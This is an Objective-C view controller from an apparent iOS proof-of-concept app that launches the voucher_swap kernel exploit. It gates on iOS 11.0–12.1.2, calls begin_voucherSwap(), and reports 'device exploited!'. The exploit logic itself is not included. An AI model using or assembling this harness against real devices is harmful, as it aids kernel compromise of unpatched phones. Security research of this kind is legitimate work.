//
//  ViewController.m
//  poc.voucherSwap
//
//  Created by Niko Tidar Lantang Perkasa on 30/01/19.
//  Copyright © 2019 Niko Tidar Lantang Perkasa. All rights reserved.
//

#import "ViewController.h"
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/utsname.h>
#include "voucherSwap.h"

// ios version detection
#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_LESS_THAN(v)                 ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_GREATER_THAN(v)              ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
}

- (IBAction) allHellBreaksLoose:(id)sender {
    printf("POC by @S0rryMyBad\nExploit by Brandon Azad\nThis project by Niko Tidar\n\n");
    printf("[i] detecting device type first!\n");
    [self beginWithDeviceCheck];
}

- (void)beginWithDeviceCheck {
    struct utsname u = {
        0
    };
    uname(&u);
    printf("%s %s %s %s %s\n", u.machine, u.nodename, u.release, u.sysname, u.version);
    
    size_t kern_psize = 0;
    host_page_size(mach_host_self(), &kern_psize);
    
    if (kern_psize == 0x4000) {
        printf("this is a 16K kernel memory page size device!\n");
        
    } else if (kern_psize == 0x1000) {
        printf("this is a 4K kernel memory page size device!\n");
        
    } else {
        printf("i have no idea what's the deal with this device's memory page size. TF?\n");
        // Will continue anyways
    }
    if (SYSTEM_VERSION_LESS_THAN(@"11.0")) {
        printf("[-] you are running a way too old version. this is very likely not supported! \n");
        return;
    }
    
    if (SYSTEM_VERSION_GREATER_THAN(@"12.1.2 ")) {
        printf("[-] you are running a version on which this exploit was patched! this is not supported! \n");
        return;
    }
    if (begin_voucherSwap() != 0) {
        printf("[+] done!\n");
        [self debug:@"successfully obtained dangling pointer. device exploited!"
          withTitle:@"^_^"];
    }
}

- (void)debug:(NSString*)message withTitle:(NSString *)title {
    UIAlertController * alert = [UIAlertController alertControllerWithTitle:title message:message
                                                             preferredStyle:UIAlertControllerStyleAlert];
    
    UIAlertAction *dismiss = [UIAlertAction actionWithTitle:@"Dismiss" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
    }];
    [alert addAction:dismiss];
    UIViewController *viewcontrl = [[[[UIApplication sharedApplication] delegate] window] rootViewController];
    [viewcontrl presentViewController:alert animated:YES completion:nil];
    _yolo.enabled = NO;
    [_yolo setTitle:@"Done!" forState:UIControlStateDisabled];
}
@end
